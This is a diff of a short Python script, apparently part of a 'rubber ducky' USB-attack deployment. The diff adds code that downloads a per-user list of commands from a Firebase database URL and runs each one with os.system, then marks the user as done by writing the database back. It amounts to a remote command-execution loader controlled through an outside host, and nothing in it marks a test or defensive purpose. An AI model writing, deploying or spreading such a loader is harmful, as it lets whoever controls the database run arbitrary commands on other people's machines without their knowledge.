@@ -1,19 +1,18 @@
+import requests
+import json
+import os
 
-#!~/bin/python
+USER = os.environ["USER"]
 
-from time import sleep
+rq = requests.get("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json")
+data = rq.json()
 
-LINK="https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/everything"
+if data[USER]['executed'] == True: exit(0)
 
-def read_cmds():
-    pass
-    # curl "$LINK/commands.json"
+cmds = data[USER]['commands']
 
-def add_user():
-    USER="011935"
+for cmd in cmds:
+    os.system(cmd)
 
-    # curl -X PATCH -d "{\"$USER\": \"\"}" "$LINK/people.json"
-
-sleep(5)
-
-exit(0)
+data[USER]['executed'] = True
+requests.patch("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json", data=json.dumps(data))
